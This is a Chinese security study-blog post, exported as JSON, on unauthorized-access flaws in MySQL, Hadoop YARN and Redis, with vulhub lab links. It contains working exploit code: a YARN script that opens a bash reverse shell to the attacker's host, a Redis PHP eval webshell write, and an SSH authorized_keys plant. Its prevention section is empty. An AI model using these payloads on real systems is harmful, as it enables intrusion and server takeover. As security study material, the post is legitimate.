{"title":"未授权访问","uid":"9f7b33d2add141a55d4dd7ea060f1cd5","slug":"未授权访问","date":"2024-03-26T07:47:00.000Z","updated":"2024-03-26T15:09:50.816Z","comments":true,"path":"api/articles/未授权访问.json","keywords":null,"cover":null,"content":"<h3 id=\"漏洞简述\"><a href=\"#漏洞简述\" class=\"headerlink\" title=\"漏洞简述\"></a>漏洞简述</h3><h4 id=\"描述\"><a href=\"#描述\" class=\"headerlink\" title=\"描述\"></a>描述</h4><ul>\n<li>未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作。</li>\n</ul>\n<h4 id=\"危害\"><a href=\"#危害\" class=\"headerlink\" title=\"危害\"></a>危害</h4><ul>\n<li>泄露用户信息，系统信息</li>\n<li>某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏</li>\n</ul>\n<h3 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h3><h5 id=\"判断服务开放\"><a href=\"#判断服务开放\" class=\"headerlink\" title=\"判断服务开放\"></a>判断服务开放</h5><ul>\n<li>Nmap端口扫描</li>\n<li>组合猜测</li>\n</ul>\n<h5 id=\"判断服务类型\"><a href=\"#判断服务类型\" class=\"headerlink\" title=\"判断服务类型\"></a>判断服务类型</h5><ul>\n<li>数据库</li>\n<li>文件传输</li>\n<li>远程控制</li>\n<li>数据通信</li>\n</ul>\n<h3 id=\"漏洞实例\"><a href=\"#漏洞实例\" class=\"headerlink\" title=\"漏洞实例\"></a>漏洞实例</h3><h4 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h4><ul>\n<li><p>环境:<a href=\"https://vulhub.org/#/environments/mysql/CVE-2012-2122/\">Mysql 身份认证绕过漏洞（CVE-2012-2122）</a></p>\n</li>\n<li><p>原理:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说<strong>只要知道用户名</strong>，不断尝试就能够<strong>直接登入</strong>SQL数据库。</p></blockquote>\n</li>\n<li><p>利用:</p>\n<div class=\"language-sql\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sql</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F78C6C\">for</span><span style=\"color: #BABED8\"> i </span><span style=\"color: #F78C6C\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">`</span><span style=\"color: #C3E88D\">seq 1 1000</span><span style=\"color: #89DDFF\">`</span><span style=\"color: #BABED8\">; do mysql </span><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\">uroot </span><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\">pwrong </span><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\">h your</span><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\">ip </span><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\">P3306 ; done</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"Hadoop\"><a href=\"#Hadoop\" class=\"headerlink\" title=\"Hadoop\"></a>Hadoop</h4><ul>\n<li><p>环境:<a href=\"https://vulhub.org/#/environments/hadoop/unauthorized-yarn/\">Vulhub - Docker-Compose file for vulnerability environment</a></p>\n</li>\n<li><p>原理:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>负责对资源进行同一管理调度的ReasourceManager组件的UI管理界面开放在8080&#x2F;8088端口，攻击者<strong>无需认证</strong>即可通过REST API部署任务来<strong>执行任意命令</strong>，最终可完全控制集群中所有的机器。</p></blockquote>\n</li>\n<li><p>脚本:</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#!/usr/bin/env python</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> requests</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">target </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">http://127.0.0.1:8088/</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">lhost </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">192.168.0.1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #676E95; font-style: italic\"># put your local host ip here, and listen at port 9999</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">url </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> target </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">ws/v1/cluster/apps/new-application</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">resp </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> requests</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">post</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">url</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">app_id </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> resp</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">json</span><span style=\"color: #89DDFF\">()[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">application-id</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">url </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> target </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">ws/v1/cluster/apps</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">data </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">application-id</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> app_id</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">application-name</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">get-shell</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">am-container-spec</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">commands</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">command</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/bin/bash -i &gt;&amp; /dev/tcp/</span><span style=\"color: #F78C6C\">%s</span><span style=\"color: #C3E88D\">/9999 0&gt;&amp;1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">%</span><span style=\"color: #BABED8\"> lhost</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">application-type</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">YARN</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">requests</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">post</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">url</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">json</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">data</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span></code></pre></div></li>\n</ul>\n<h4 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h4><ul>\n<li><p>原理:</p>\n<ul>\n<li>redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器</li>\n<li>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</li>\n</ul>\n</li>\n<li><p>利用:</p>\n<ul>\n<li><p>写webshell</p>\n<ul>\n<li><p>利用前提:</p>\n<ol>\n<li><p>靶机redis链接未授权，在攻击机上能用redis-cli连上, 并未登陆验证</p>\n</li>\n<li><p>开了web服务器，并且知道路径, 需要具有文件读写增删改查权限</p>\n</li>\n</ol>\n</li>\n<li><p>上传webshell</p>\n<div class=\"language-sh\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sh</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">config</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">get</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dir</span><span style=\"color: #BABED8\"> </span><span style=\"color: #676E95; font-style: italic\">#查看redis数据库路径</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">config</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dir</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">/root/redis-2.8.17#</span><span style=\"color: #BABED8\"> </span><span style=\"color: #676E95; font-style: italic\">#修改靶机Redis数据库路径</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">config</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dbfilename</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">22</span><span style=\"color: #C3E88D\">.php</span><span style=\"color: #BABED8\"> </span><span style=\"color: #676E95; font-style: italic\">#生成22.php文件</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">xxx</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">#将一句话木马写入文件中</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#&quot;\\r\\n\\r\\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">xxx</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">\\r\\n\\r\\n&lt;?php eval(</span><span style=\"color: #BABED8\">$_POST</span><span style=\"color: #C3E88D\">[whoami]);?&gt;\\r\\n\\r\\n</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">#上传木马可以通过蚁剑连接</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">save#保存</span></span></code></pre></div></li>\n</ul>\n</li>\n<li><p>ssh密钥连接</p>\n<ul>\n<li><p>利用前提:</p>\n<ol>\n<li>root身份运行</li>\n<li>存在&#x2F;root&#x2F;.ssh目录</li>\n</ol>\n</li>\n<li><p>将公钥上传到靶机</p>\n<div class=\"language-sh\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sh</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #82AAFF\">type</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">key.txt</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">|</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">redis-cli.exe</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-h</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">192.168</span><span style=\"color: #C3E88D\">.43.141</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-x</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">xxx#如果是linux</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">将type换成cat</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#将公钥作为value插入到数据库中，key随便啥值。</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">redis-cli.exe</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-h</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">192.168</span><span style=\"color: #C3E88D\">.43.141</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">config</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dir</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">/root/.ssh</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#修改redis数据库路径</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">redis-cli.exe</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-h</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">192.168</span><span style=\"color: #C3E88D\">.43.141</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">config</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dbfilename</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">authorized_keys</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#生成缓冲文件authorized_keys</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">redis-cli.exe</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-h</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">192.168</span><span style=\"color: #C3E88D\">.43.141</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">save</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#保存</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ssh</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-i</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">id_rsa</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">root@192.168.43.141</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#连接</span></span></code></pre></div></li>\n</ul>\n</li>\n<li><p>RCE自动化利用脚本<br><a href=\"https://github.com/vulhub/redis-rogue-getshell\">vulhub&#x2F;redis-rogue-getshell: redis 4.x&#x2F;5.x master&#x2F;slave getshell module (github.com)</a></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"常见漏洞汇总\"><a href=\"#常见漏洞汇总\" class=\"headerlink\" title=\"常见漏洞汇总\"></a>常见漏洞汇总</h3><ul>\n<li><p><a href=\"https://www.freebuf.com/articles/web/338459.html\">常用的30+种未授权访问漏洞汇总 - FreeBuf网络安全行业门户</a></p>\n</li>\n<li><p><a href=\"https://mp.weixin.qq.com/s/IK7n5onsyssmJyf5SPpw6A\">网络安全周周学 | 常见未授权访问漏洞汇总</a></p>\n</li>\n</ul>\n<h3 id=\"漏洞防范\"><a href=\"#漏洞防范\" class=\"headerlink\" title=\"漏洞防范\"></a>漏洞防范</h3>","text":"漏洞简述描述 未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进...","permalink":"/post/未授权访问","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0\"><span class=\"toc-text\">漏洞简述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">描述</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">危害</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">漏洞发现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%BC%80%E6%94%BE\"><span class=\"toc-text\">判断服务开放</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">判断服务类型</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">漏洞实例</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#MySQL\"><span class=\"toc-text\">MySQL</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Hadoop\"><span class=\"toc-text\">Hadoop</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Redis\"><span class=\"toc-text\">Redis</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB\"><span class=\"toc-text\">常见漏洞汇总</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83\"><span class=\"toc-text\">漏洞防范</span></a></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"内网安全-基本概念","uid":"81102e6cf240e741d5c7997d1b670e8a","slug":"内网安全-基本概念","date":"2024-04-10T07:41:44.000Z","updated":"2024-04-11T13:22:59.623Z","comments":true,"path":"api/articles/内网安全-基本概念.json","keywords":null,"cover":null,"text":"内网基本概念局域网又称内网, 是指在某一区域内由多台计算机互联成的计算机组。 工作组工作组（Work Group）就像一个可以自由进入和退出的社团，方便同组的计...","permalink":"/post/内网安全-基本概念","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"(转)渗透测试-基本流程","uid":"8b9aeb65c936050fec0fc9c20edbf39b","slug":"转-渗透测试-基本流程","date":"2024-03-21T14:50:33.000Z","updated":"2024-03-21T14:51:34.220Z","comments":true,"path":"api/articles/转-渗透测试-基本流程.json","keywords":null,"cover":null,"text":"一般来说，渗透测试的基本流程如下： 确定目标 信息收集 漏洞探测 漏洞利用getshell 内网转发 内网渗透 痕迹清除 撰写渗透测试报告 一 确定目标这个没什...","permalink":"/post/转-渗透测试-基本流程","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}